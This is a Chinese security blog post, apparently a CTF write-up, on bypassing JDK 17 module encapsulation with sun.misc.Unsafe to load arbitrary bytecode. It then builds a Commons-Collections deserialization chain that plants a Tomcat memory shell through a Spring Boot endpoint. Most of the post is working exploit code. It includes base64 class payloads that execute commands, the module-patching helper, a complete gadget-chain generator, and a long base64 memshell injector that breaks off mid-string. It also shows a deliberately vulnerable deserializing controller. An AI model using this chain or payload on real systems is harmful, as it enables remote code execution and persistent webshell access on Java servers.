JDK高版本的模块化以及反射类加载限制绕过
=====================

打巅峰极客的时候遇到的一个东西，觉得很有必要学习一下。当时题目直接给出“JDK17+CB”反序列化，我由于对高版本JDK有一种陌生的恐惧感，写EXP时有点畏手畏脚，最终导致题目没有做出来，赛后观摩了其他做出来师傅的WP，发现其实这个问题只要熟悉了就还能做。

JDK9之后的模块化
==========

Java模块化主要是用来解决依赖的问题，以及给原生JDK瘦身这两个作用。

在此之前，java项目一般都是由一堆class文件组成，管理这一堆class文件东西叫jar。但是这些class的有分两类，一类是我们自己项目的class，一类是各种依赖的class。jar可不会管他们之前的关系，他只是用来存放这些class的。所以一旦出现漏写某个依赖class所对应的jar，程序就会报"ClassNotFoundException"的异常了。

也正是为了避免这种问题，JDK9之后开始推行模块化，具体体现在：如果a.jar依赖于b.jar，那么对于a这个jar就需要写一份依赖说明，让a程序编译运行的时候能够直接定位到b.jar。这个功能主要就是通过`module-info.class`​中的定义的。

了解上述定义即可，现在主要是探究模块化关于漏洞利用这一块的限制。首先就是class的访问权限，一般就分为public protected private和默认的包访问限制，但是到了模块化之后折现访问权限就仅限于当前模块了，除非目标类所在模块明确在module-info中指出了该类可被外部调用，不然依然无法获取到。

‍

JDK17新特性--强封装
=============

<https://docs.oracle.com/en/java/javase/17/migrate/migrating-jdk-8-later-jdk-releases.html#GUID-7BB28E4D-99B3-4078-BDC4-FC24180CE82B>

Oracle官方上述文档中提到了`Strong Encapsulation`​，这个主要就是针对`java*`​包下的所有非public字段的如果我们在JDK17的时候对`java*`​下的非公共字段进行反射调用的话就会直接报错。

其实这个东西在JDK9之后就开始被标记为了不安全选项,但是由于很多大型项目之前都会直接使用反射这个功能，所以直到JDK17才将其强制化。

这里写一段示例代码：

```java
package org.example;

import java.lang.reflect.Method;
import java.util.Base64;

public class Test
{
    public static void main( String[] args ) throws Exception {
        String payload="yv66vgAAAD0AIAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEABGNhbGMKAAgAEAwAEQASAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwcAFAEAE2phdmEvbGFuZy9FeGNlcHRpb24HABYBABBvcmcvZXhhbXBsZS9FdmlsAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABJMb3JnL2V4YW1wbGUvRXZpbDsBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhACEAFQACAAAAAAACAAEABQAGAAEAFwAAAC8AAQABAAAABSq3AAGxAAAAAgAYAAAABgABAAAAAwAZAAAADAABAAAABQAaABsAAAAIABwABgABABcAAABPAAIAAQAAAA64AAcSDbYAD1enAARLsQABAAAACQAMABMAAwAYAAAAEgAEAAAABgAJAAgADAAHAA0ACQAZAAAAAgAAAB0AAAAHAAJMBwATAAABAB4AAAACAB8=";
        byte[] bytes= Base64.getDecoder().decode(payload);
        Method defineClass= ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        defineClass.invoke(ClassLoader.getSystemClassLoader(), "attack", bytes, 0, bytes.length);
    }
}
```

恶意字节码构成，注意这里不能有Package的定义：

```java
public class Evil {
    static {
        try{
            Runtime.getRuntime().exec("calc");
        }catch(Exception e){
        }
    }
}
```

理论上来说测试代码运行之后就会触发命令执行，但是在JDK17中就会出这样的报错，报错位置很容易定位到是SetAccessible中出了问题。

​![image](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-8baa47a264babbd7ead978be34204a47e3813599.png)​

但是JDK肯定不会就这么把反射这么强大的功能抛弃，他还是留了一手。先看看SetAccessible源码被改成什么样了

```java
    public void setAccessible(boolean flag) throws SecurityException {
        SecurityManager sm = System.getSecurityManager();
        if (sm != null) sm.checkPermission(ACCESS_PERMISSION);
        setAccessible0(this, flag);
    }
```

setAccessible0就是最终将当前反射获取到的变量中`override`​属性值设置为true，不论是JDK8还是JDK17都是如此。重点是checkPermission的区别,JDK17中checkPermission最终调用到了checkCanSetAccessible方法：

```java
private boolean checkCanSetAccessible(Class&lt;?&gt; caller,
                                          Class&lt;?&gt; declaringClass,
                                          boolean throwExceptionIfDenied) {
        if (caller == MethodHandle.class) {
            throw new IllegalCallerException();   // should not happen
        }

        Module callerModule = caller.getModule();
        Module declaringModule = declaringClass.getModule();
        //如果被调用的变量所在模块和调用者所在模块相同，返回true
        if (callerModule == declaringModule) return true;
        //如果调用者所在模块跟Object所在模块相同，则返回true
        if (callerModule == Object.class.getModule()) return true;
        //如果被调用模块没有定义，则返回true
        if (!declaringModule.isNamed()) return true;

        String pn = declaringClass.getPackageName();
        int modifiers;
        if (this instanceof Executable) {
            modifiers = ((Executable) this).getModifiers();
        } else {
            modifiers = ((Field) this).getModifiers();
        }

        //如果当前被调用属性值是public，那就直接返回true
        // class is public and package is exported to caller
        boolean isClassPublic = Modifier.isPublic(declaringClass.getModifiers());
        if (isClassPublic &amp;&amp; declaringModule.isExported(pn, callerModule)) {
            // member is public
            if (Modifier.isPublic(modifiers)) {
                return true;
            }

            //如果被调用属性是protected并且是static，返回true
            // member is protected-static
            if (Modifier.isProtected(modifiers)
                &amp;&amp; Modifier.isStatic(modifiers)
                &amp;&amp; isSubclassOf(caller, declaringClass)) {
                return true;
            }
        }

        //如果在模块define中，定义了该属性值是open的，返回true
        // package is open to caller
        if (declaringModule.isOpen(pn, callerModule)) {
            return true;
        }

        if (throwExceptionIfDenied) {
            // not accessible
            String msg = "Unable to make ";
            if (this instanceof Field)
                msg += "field ";
            msg += this + " accessible: " + declaringModule + " does not \"";
            if (isClassPublic &amp;&amp; Modifier.isPublic(modifiers))
                msg += "exports";
            else
                msg += "opens";
            msg += " " + pn + "\" to " + callerModule;
            InaccessibleObjectException e = new InaccessibleObjectException(msg);
            if (printStackTraceWhenAccessFails()) {
                e.printStackTrace(System.err);
            }
            throw e;
        }
        return false;
    }
```

总结几个返回true的可能性：

- 调用者所在模块和被调用者所在模块相同
- 调用者模块与Object类所在模块相同

后续以及其他的还有的返回true的情况是该属性值本身的定义所决定的，我们无法改变。针对上面三种情况，我们可以通过unsafe模块来达成目的。

Unsafe模块的作用还有很多，属于是积累起来很不错的一块知识点，这里我们只记录如何通过Unsafe模块进行目标类所在moule进行修改，整体的思路为：获取Object中module属性的内存偏移量，之后再通过unsafe中方法，将Object的module属性set进我们当前操作类的module属性中。

Unsafe修改类所属module
=================

Unsafe模块中有几个方法相关：

**1.objectFieldOffset**

​![image](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-a1b7a50017ce494b476f1b92026ebbd4b8ece907.png)​

用于获取给定类属性值的内存偏移量，用来找到module属性值的地方

**2.getAndSetObject**

​![image](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-c7e7c1c3b527addefd43fdece8cde7f023fc6be6.png)​

用来根据内存偏移量以及具体值，来给指定对象的内存空间进行变量设置，跟反射的功能差不多。

其实具体的操作有上述两个方法已经足够了，但unsafe中能够根据内存偏移量和具体值进行set操作的方法可不止这一个，比如putObject也可以实现这个功能，并且方法调用的给值都是相同的。

再看具体操作：

```java
package org.example;

import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

public class Test {
    public static void main(String[] args) throws Exception {
        String payload = "yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAoACwcAHQwAHgAfAQAEY2FsYwwAIAAhAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACIBAARFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAIAAQAKAAsAAQAMAAAAHQABAAEAAAAFKrcAAbEAAAABAA0AAAAGAAEAAAADAAgADgALAAEADAAAAFQAAwABAAAAF7gAAhIDtgAEV6cADUu7AAZZKrcAB7+xAAEAAAAJAAwABQACAA0AAAAWAAUAAAAGAAkACQAMAAcADQAIABYACgAPAAAABwACTAcAEAkAAQARAAAAAgAS";
        byte[] bytes = Base64.getDecoder().decode(payload);

        Class UnsafeClass=Class.forName("sun.misc.Unsafe");
        Field unsafeField=UnsafeClass.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        Unsafe unsafe=(Unsafe) unsafeField.get(null);
        Module ObjectModule=Object.class.getModule();

        Class currentClass=Test.class;
        long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
        unsafe.getAndSetObject(currentClass,addr,ObjectModule);

        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        ((Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), "Evil", bytes, 0, bytes.length)).newInstance();
    }
}
```

可能会有一个疑问：为什么我们获取到了Class的module内存偏移，就一定能够笃定当前类的内存偏移量与其相同呢？这个其实很好理解，因为所有的类都是继承自Class类的，并且module属性值不是某一个特定类的特定属性值，而是Class类中定义的，用于给所有类都设置的一段属性值，其他类是没有对其进行修改的，所以每一个类的module内存偏移量都是相同的48

之后再运行就能够成功执行恶意代码了

​![image](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-479c84b73b4215a8e5d03176e69114fed9fe90ac.png)​

‍

实战举例
====

这里我拿注入内存马举例，假设此时在Springboot3中存在如下路由：

```java
import jakarta.servlet.http.HttpServletRequest;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.Base64;

@Controller
public class AdminController {

        @RequestMapping("/test")
        public void start(HttpServletRequest request) {
            try{
                String payload=request.getParameter("shellbyte");
                byte[] shell= Base64.getDecoder().decode(payload);
                ByteArrayInputStream byteArrayInputStream=new ByteArrayInputStream(shell);
                ObjectInputStream objectInputStream=new ObjectInputStream(byteArrayInputStream);
                objectInputStream.readObject();
                objectInputStream.close();
            }catch (Exception e){
                e.printStackTrace();
            }
        }
}

```

在原生Springboot下存在高版本CB依赖，我们该如何去通过该反序列化接口打入内存马呢？这里其实就是巅峰极客上的一道Java题了，但是我没有给waf，还需要用到一些绕过手法，就不在这里补充了，除了这一点，跟原题描述的场景是一样的。现在看到的解出方式是了解CB高版本依赖下是自带CC依赖的，并且该CC的版本不是很高，1.9.0的CB依赖下是CC3.2.1,还是存在一定的利用空间的，但是到了1.9.3（或者其他比较高版本的CB，具体没有去测）的话，CC的依赖就变成了3.2.2的版本，有些关键类就用不了了。

了解这些具体背景，开始实际分析和操作：

反序列化链构造及其相关绕过点
--------------

### 0x01 最终memshell注入绕过

templatesImpl在JDK高版本之后就无法再利用了，这里采取的思路还是通过InvokeTransformer，间接调用到defineClass进行字节码加载，所以一定会用到`ChainedTransformer`​。但是有个麻烦事，就是我们还要去实例化一个ClassLoader，这放在反序列化链子里面去触发就很麻烦。这个时候就有一个新的反射调用的方式能够直接调用到defineClass加载字节码---MethodHandles，具体通过ChainedTransformer构造如下：

```java
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(MethodHandles.class),
                new InvokerTransformer("getDeclaredMethod", new
                           Class[]{String.class, Class[].class}, new Object[]{"lookup", new
                        Class[0]}),
                new InvokerTransformer("invoke", new Class[]
                        {Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("defineClass", new Class[]
                        {byte[].class}, new Object[]{data}),
                new InstantiateTransformer(new Class[0], new
                        Object[0]),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new
                Transformer[]{new ConstantTransformer(1)});

```

起到的作用可以用一句代码来总结

```java
MethodHandles.lookup().defineClass("your memshell byteCode")
```

这里再补充一下`MethodHandles.lookup().defineClass`​的意思，我们定位到MethodHandles的lookup方法，发现它本质上是返回MethodHandles的一个内部类Lookup。并且注意此时传递了一个参数进去，是通过`Reflection#getCallerClass()`​调用过后的结果传入的。

​![image-20240829032029-0xjonv1](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-81c65094041b9130cad227c28d0ce057aa3ebb94.png)​

这里我就不卖关子了，给出具体的绕过点：

此时的结果是`org.apache.commons.collections.functors.InvokerTransformer`​,之后我们通过defineClass加载到的类必须要和此Caller类的包名相同，不然无法加载。具体的判断逻辑看defineClass：

​![image-20240829031925-m9uxfd6](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-dffda74b2d9ceacf3f478efdc6beaa4a0a68b38c.png)​

跟进makeClassDefiner方法，持续跟进到newInstance方法，中间有段trycatch块的内容，具体是用ASM处理指定字节码，并且获取到该加载类的全类名，存储为name变量。

​![image-20240829032830-45yemn1](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-eadedcea49d9325085ad857b59aeb86f62ec4052.png)​

之后获取到具体类名，截取为index。pn具体就是加载类的全类名，然后此时pkgName就是调用类--`InvokerTransformer`​的全类名：`org.apache.commons.collections.functors`​。所以最终的效果就是判断调用类和指定加载类是否在同一包下，如果不在就不给你返回字节码内容ClassFile，直接抛出异常。所以我们指定Memshell注入器包名必须为`org.apache.commons.collections.functors`​，恶意filter（或者其他什么组件）无所谓，我们可以在注入器中执行任意java代码的话，可以直接通过获取Context的ClassLoader，调用其defineClass进行字节码加载，就不需要用到`MethodHandles.lookup().defineClass`​了。

‍

0x02 JDK17-module绕过
-------------------

这个内容前面补充过了，直接封装成一个方法用以方便多次调用即可

```java
    private static void patchModule(Class classname){
        try {
            Class UnsafeClass=Class.forName("sun.misc.Unsafe");
            Field unsafeField=UnsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe=(Unsafe) unsafeField.get(null);
            Module ObjectModule=Object.class.getModule();

            Class currentClass=classname.getClass();
            long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            unsafe.getAndSetObject(currentClass,addr,ObjectModule);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
```

于是整体的反序列化链外壳已经初具模样了

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.Unsafe;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.invoke.MethodHandles;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Demo
{
    public static void main(String[] args) throws Exception{
        patchModule(Demo.class);
        String shellinject="your memshell bytecode";
        //byte[] data=Files.readAllBytes(Paths.get("H:\\ASecuritySearch\\javasecurity\\CC1\\JDK17Ser\\src\\main\\java\\org\\example\\shell.class"));;
        //byte[] data=Base64.getDecoder().decode(shellinject);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(MethodHandles.class),
                new InvokerTransformer("getDeclaredMethod", new
                           Class[]{String.class, Class[].class}, new Object[]{"lookup", new
                        Class[0]}),
                new InvokerTransformer("invoke", new Class[]
                        {Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("defineClass", new Class[]
                        {byte[].class}, new Object[]{data}),
                new InstantiateTransformer(new Class[0], new
                        Object[0]),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new
                Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        innerMap.remove("keykey");

        setFieldValue(transformerChain,"iTransformers",transformers);
        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(serialize(expMap))));
    }

    private static void patchModule(Class classname){
        try {
            Class UnsafeClass=Class.forName("sun.misc.Unsafe");
            Field unsafeField=UnsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe=(Unsafe) unsafeField.get(null);
            Module ObjectModule=Object.class.getModule();

            Class currentClass=classname.getClass();
            long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            unsafe.getAndSetObject(currentClass,addr,ObjectModule);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) {
        try {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static byte[] serialize(Object object) {
        try {
            ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(object);
            objectOutputStream.close();
            return byteArrayOutputStream.toByteArray();
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

}

```

0x03 注入器逻辑处理
------------

首先第一点就是我们注入器的包名必须是`org.apache.commons.collections.functors`​，除此之外，由于也是执行java代码，并且不可避免的要用到反射调用非public字段的逻辑，所以我们还需要加上JDKModulepatch的功能，并且在所有注入逻辑之前执行。

JDK17下的filter相关信息组件又替换到了jakarta包下，必须重新考虑Class.forName初始化类时的包名。

还有很多问题，不过都是关于memshell注入的相关绕过和完善补充，本来的想法是用和队里师傅一起魔改的JMG生成一个，因为Tomcat10之后的情况补充我们已经改完了，但是JDK17modulepatch的逻辑还没有加上，正瞅着又要开始弄二开的时候，看了JMG更新了，补充modulepatch，就拿来再次二开了一下，用以解决跨线程注入的问题。具体的代码就不公开了，其实就是forName的时候注意指定ClassLoader就行，不然有些空线程没有设置Tomcat的类路径配置，无法加载Tomcat下的类

就直接拿改过的JMG生成一下，先测试正常情况下的Springboot3下的Tomcat10.x+JDK17能否成功注入

​![image-20240829040034-10pepl0](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-8363c0fd0e90d769bd386ed3ef2820a527be4ad0.png)​

之后再将base64字节码放入反序列化链的data中

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.Unsafe;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.invoke.MethodHandles;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Demo
{
    public static void main(String[] args) throws Exception{
        patchModule(Demo.class);
        String shellinject="yv66vgAAADEBxwEALW9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9mdW5jdG9ycy9zaGVsbAcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAA1nZXRVcmxQYXR0ZXJuAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAL0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvZnVuY3RvcnMvc2hlbGw7AQACLyoIAAwBAAxnZXRDbGFzc05hbWUBAC5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuaW5qZWN0CAAPAQAPZ2V0QmFzZTY0U3RyaW5nAQAKRXhjZXB0aW9ucwEAE2phdmEvaW8vSU9FeGNlcHRpb24HABMBABBqYXZhL2xhbmcvU3RyaW5nBwAVARB0SDRzSUFBQUFBQUFBQUtWWENYaGNWUlgrYjJhU041bE10MHliZHByU2pTNlRkZEtWTmwzSTBrQkRNeWswWFVpTDRNdmtKWmwyTWpPWmVaTTJaVlZCSzY0b0xpaFdyV0pkRUVzTGs0WUsxQTBVUkVSUUVCSDNmVUZVVkJTTi83MXZaakxKSkduOS9MNlpkKys3OSt6M25QK2U5OWgvSG5nSXdBclJLRkFkaVhYNzlLZ2U2REY4Z1VodmJ5UWM1eGdLR1FFektPZGRpWERBak1UaXZtQjRQOWMwQ0lGWisvViszUmZTdzkyK3hwQWVqN2RFOUU0anBzRW1VTEpmUDZESFROMFhOMkw5SWNQMFhSSU1tWEl2WDZCZ1l6QWNORGNMMkx4bHV3WHNqWkZPUTJCYVN6QnN0Q1o2TzR6WVRyMGp4SlhpbGtoQUQrM1dZMEg1bmxxMG16M0J1RUJOeS85bTd3WVhORGljc0dPcXdGeHZ5N2lXYjVEbWlNTUNzeWZZbDBLbVN5RnUwb3lRdEpteFlMaTdJUkVNS2Zkbk9WRWkxZGlqNUpSdWpLV2tuRG53RkNJUGN4a05QUm8xd3AwQ1ZkNWN3cktjcFpRV2lwaUhDNlNpK1l6akFXUEFoWVdXeUVVQ0RqTmlFUXZNOU9hS0lPK0ZXQ0o1bDVLM3QzT053TEx6MGszRzVmQTZxYVJNenBTNkNrYnNDcWFDZDE5RDJkaW9iUkRJQzNUd3NhOUJvS2pUNk9JSnF3MUdqL1ROemJrY0xxekFTaG5oVlpSN1NFQWozZDR5eWU4ZUlXMDZGRENpOHBnMVhFU3lBTlVyUVlkOGdkaEExSXo0R29QUkhzYUlSOUN2eDFhbnQ4Y3djMXZRRXRITC8xNE5OU2tWWTRSb3FCZVkwbWJxZ1FOK1BacEtRbHQ5VTVzRFcraFV0MkUyaCtPbUhnNXd1V3pDS0k2MXpJVkxjS2tURGRncXNHQVVRVHhxQkh4dFJpQm1tTnVNZ1RhK2FiaE1ZUHBZd1JwYWVOQlUzekJnR25URDdtV1VYR2pGZGlmOHVOeUs4RGptN0pZNXZNT0piV2dqa3l4RVNkcHNVY2FOUUNJV05BZDhWSzFJZDJHM3RISVBENkl6Y2trd3JJZVlzUEtvcGE1MjdKV2Ird1F1R01QdU4rSnh2ZHZZRXV3MjRpYmpiS00zZlBxM3JISGdHb0hTU2FnMTZBSXJKazdIQ1hUSWdBYWM2QUFMcVNCa2hMdk5Ib1V2elM1MG9WdUdoTzhGaVdpbmJocFdWakg3Nk9CK0hKQmNkR3VtRXQrcm16MitobUIzYzlnMHV1WHBoOG5XcVhTNEVKWEI3VUNmakVFemc2QmlHWGNpQWxOV1FQTUVwZFl2S1E0eVdjeklMdFo2ckZHUEd5NE15QkwwZzJqajZ1REMydFZONFlBQ3dwSXhwWlNTUktzdGl0aG9TTm5lb2ZDTk5sbGlCR2FNVTRleUVOYXlFanVZS3ZuOWVpaGhwSEtxT21FR1E5VU5pdFdCVzRqRFk1ZzF2SVdxdXlLeFZyMlhURXZQZ1JUcE1uNHJiblhpQ040bTRHU1NwaXgzNEIwMGZsOE91WVozQ1JTU3ptK1lQUkVlWWQwNFduTFpzdlhHakM2Si9UNUxBZzI0RGUrUkJyeVhaYjB2TjF3YTNpY3daeUoyRFI5Z1BJUGgvc2dCdXJ6ZW04cy9qc2l5M0NVWDdzQ0huUGdnUGp5cWdxMWREUit4S2pnRmlXN3ZlSEg4S0Q3bXhGRjhYR0Nxb1lLNE00WHREbnlDdVJKUGhLdDdnL0ZBZFVOOVcxTTZoeGpudTVodVllUGdDRGFOdmdneTloM0hwMldVUGtOM0xmRU9mSTVIbGdGSjJ1V1FsUzh2YndGZFJtTDB2ZDVtalR1TXZvU3N3NG4zNDFGS00zSUpMTm1OUFhvd3JPN2ZoU05XV3RhYlFWMWFrZ1g2SjBaVDhkTHYxa1AxZ1FBUklZdnFKSEc5aTM4Nm4zMkFPNnlURHZZYjIxbUxvMFhMS3RKanNlMEoxdk1DaXljWThVbUVyWS9GOUFHdVJ4TW13Mi9vdmJJZTQxUklMb0hGT1Y3MW1HYlV0NVdQTm90R2xpQ3hoOWcyTlQ0cVluVGxYREZsVGNaSFIxRmcwVGtEelRvUHlLQmE2RHh4ek9sSExHMUsyV1IrakxISkVjc1lVMzRlYkJtcjVrL3VyWVpIMUpVNHFYTWF2cTV1a1FtOTB2Q1l3UEx6ZEViRE41a2k1K3VDaG0rcDlKdjh2RFY4bTRHZk5JTTBmSWVOMS9rbHBvWm5XSlU5aHV4Q0pRNjc4RDJyL1hyV3dzMnRhc2VGNzhOYmhDZndQS3ZmSXQ0dG9kNkZGeXpxSC9MWUFwR3d5UWl4c0V0SHRjRTllcXhOeG9Ob3NhRnNyd3Mvd28vbC9mUVRDOERiMHFtK3hEdHBrbGpKN3NMUDhITnB5Qzk0dTVIN2NqMUdvMDFwNGE4c0MzK2R1ZmEyR09scmI1eUxSYlladjhYdlpNdjVleGZXWUsyYy9aRXBHOVVIUXV6SkhmaVRwYUhlSkVkSFFsN3U1K3BsTTlqM1oveWxDRS9ocjZ6Sk5BcGJmYjZBSnhlTE01OEFmOFBmSldUK1E1cmlkcUVLMVhMMkw5b1JIMlhIOG5Ic0dPZldZQlB4Yi94SEdqTE1VRWZUa1lvN2hKQ0JHbmJpYWZYTmtwVW9DV0ppcnpHU0hJSWZWWE95dGUzc2lVVU95bGJWNnZlRTVoUUZ3aUV4dmkraGgrS3lXUm5Ia3IwdTRSUkZ2RzJFeThxcVBXeTBaRFJtcDZQQlZMNmNmcVEyTnJqRVZER3RDRStLNmFTUEp6cmlxWStPRW0venVMMlFLQlp1NXBTWW1lN21SOHZUUkFsQjY2Q2NqN0Z3cEhrVmM0VEhLV2FMdWZKU1hLcDZxa3h4dWNRRnNrRjdXc3gzNFRwY3oxTVJDNmxUOWw5K3NWaGd5LzkvZThsdzNpT1dGT0Z4c1hRY0ZFaVJaNTNNOGl4WG03ZG5iWlJKZkE3cGh3L0wxdHBJOVhXeVMrUFhtSTJCekwzYnJVS0pPWVNQcVdheE5DUzZ1dVRLQ3F0SU14U3JaTk9xWGh5QzhoYmxPcDdDeWtpNEs5aXRybDFYVjlZS1VYcHlEbVUwcll3TUVGRTJCa0xxZzk2Qk9XeHpWZ1hXR2pVZDYvVDFnUlZyVnE1Y3JUdkVKbElUM0l5WU5PMWl2dXlKaEE5MzlIVTRSRDBXc1hUc29MbklSNkg4cGdUZ2tGL0hhbHlvUmlIQlRvMHZxTEdJTTM3TTgxbkl0M3BLRUJ6ZDVZT1lWdTRXZGZmak9RNE45K1BGZTdtY0J5ZWZza0tCK1NqR0FySURMb3VGNHhRbG1KLzFLWEVoVWtyYW12S0tRY3djTGU4TVN0b0hNZnNrU3BOWWNCS0wrVXhpMldtVW4wTGxpSzZwc1BHNW1OSXZoQTlMbEw0U1MyWktuNXpOb0Mxc1RpUjhwRFJ2WWlBa1ZXRjVoYTNpb1VHc1BwRVJXYURNWFo0bHFqQWpxcEJLYXBRb3dtTksxTFBrc0hPc0tHNDZqZWJXcW5sM1FMTWZoejMvRExhMUs4T3ZLRzRheE00a3JxeXFTT0txRTYzaVJFcUZGK3RvdjFNcHl1ZXppcUtxNlkyUE96VW80K2U1TkdJMTl3cTR1aDYxcEM2alNSdXdVZmxka1RHc2doN1ZLS2tWMkl5TFNkUElPYW1HTVExMkRYa2E2b1RHRDBqNUdPWlc5aG9uRFdJWXMyRkxMVXFxZFNwRnZDa242WS9TV0NOYWlsOS9Hb2Evc3B4KzJmZ0lKdEY3QnBGMmUyVVNzVUVrcGs5UDRsQVMxN2FReFY4aFBjMURPVDFMZXpxZjV3OEdMNDhyRHZvMGkxNlYwOUlxZWxWTkw2VEhDMG5yb01lYjhiclVXVzVTeVpoSGlxczVFOG83Ti9LR3lVYUwvZnhaTnROWW9oRUphYlJvVnBrT0hLTFJiejZOdC9zcmk5OHB6dUxkU2R4ZXlmSDlTZHpaV3BYRXNlSlAyaC9Fa1haYmNWMGJ0NnI0Y3JUZFZzNzVuV2ZocHgvclc0cy9wZGlUK0d5dDNXT1hMSGRuczNqc09UejV0WFk2TDlON0UrcG9XRDM2WUdhQ3NKSUhaMVhURmpyYWhGSitVVzlDS3lrdjVXb3puNWZSbzIzazhaT3JCZjNZcmdLemxjRXJaV0J1d0kwcVJPdHdFOTVBS1g2bXZseXprN01xdFZiUEhIMWpLbEVPNFUwTW9neGdQMjdPQkxCTXBrZWRPdkowQUlleFNxYUdlcGZ4bEd1dmt2enpNbVU0Y2dYMzRBdFdnUFB1Wm5ocGxwaFhjUlpQMU5vcnorTEoybnlQdmZ3K1BEZUVIK1RoRWJ5VTljYkppMG44OUE0ODc3RVA0WmNDdFFYbEhqc0xmQWkveVVNU2Y2alZ5ajJhTFltWGFqVlBRZkhMUTNnbEQ0OWlzWnlmUVY0N2srMVlFcThPNHA4ZUxZblhob2pkek10YlBYYTN5UE5vUThKbXd4azgzVDRvN0xXT0RQOVpISkduVm5nYzAycWRaMFJCdThjNUtBb2Y5aFI2SEVreFpROUh1eHJ6aDhRTW